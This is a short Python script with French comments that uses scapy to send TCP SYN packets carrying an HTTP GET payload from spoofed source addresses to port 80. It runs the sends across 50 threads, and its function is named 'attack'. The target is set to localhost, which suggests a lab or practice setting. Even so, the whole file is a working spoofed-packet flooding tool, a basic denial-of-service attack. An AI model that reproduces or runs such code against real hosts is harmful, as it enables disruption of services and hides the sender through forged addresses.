from scapy.all import *
import threading

# Cibles
target_ip = "localhost"
target_port = 80

# Liste d'IP à "spoof"
fake_ips = ["192.168.1.201", "192.168.1.202", "192.168.1.203"]


threads = 50

def attack(fake_ip):
    try:
        ip = IP(src=fake_ip, dst=target_ip)
        tcp = TCP(sport=RandShort(), dport=target_port, flags="S")  # Flag SYN pour une requête TCP
        raw = Raw(b"GET / HTTP/1.1\r\nHost: " + target_ip.encode() + b"\r\n\r\n")
        packet = ip / tcp / raw

        send(packet, verbose=0)
    except Exception as e:
        print(f"Erreur lors de l'attaque: {e}")

for i in range(threads):
    fake_ip = fake_ips[i % len(fake_ips)]
    thread = threading.Thread(target=attack, args=(fake_ip,))
    thread.start()

